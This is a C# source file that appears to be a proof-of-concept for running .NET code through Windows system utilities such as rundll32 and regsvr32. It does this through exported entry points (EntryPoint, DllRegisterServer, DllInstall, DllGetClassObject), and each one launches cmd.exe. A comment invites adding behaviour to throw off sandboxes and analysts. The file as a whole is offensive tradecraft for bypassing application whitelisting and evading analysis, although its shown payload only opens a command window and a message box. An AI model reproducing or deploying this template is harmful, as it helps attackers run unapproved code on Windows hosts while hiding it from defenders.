using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;


public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
        //Add any behaviour here to throw off sandbox execution/analysts :)
    }

}

public class Thing0
{

    public static void ExecParam(string a)
    {
		Process p = Process.Start("cmd.exe");
		SetWindowText(p.MainWindowHandle, a);
    }
	
	[DllImport("user32.dll")]
	static extern int SetWindowText(IntPtr hWnd, string text);

}


class Exports
{

    //
    //
    //rundll32 entry point
    public static void EntryPoint(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
    {
        Thing0.ExecParam("EntryPoint"); 
    }

    public static bool DllRegisterServer()
    {
        Thing0.ExecParam("DllRegisterServer"); 
        return true;
    }

    public static bool DllUnregisterServer()
    {
        Thing0.ExecParam("DllUnregisterServer"); 
        return true;
    }

    
	public static void DllInstall(bool bInstall, IntPtr a)
    {
        string b = Marshal.PtrToStringUni(a);
        Thing0.ExecParam(b);
    }
	
	public static Int32 DllGetClassObject(IntPtr rclsid, IntPtr riid, ref IntPtr ppvObj) {
		
        
		string b = Marshal.PtrToStringUni(rclsid);
        
		System.Windows.Forms.MessageBox.Show("Hell Yeah! Boom!");
		return 0x0;
	}
	
}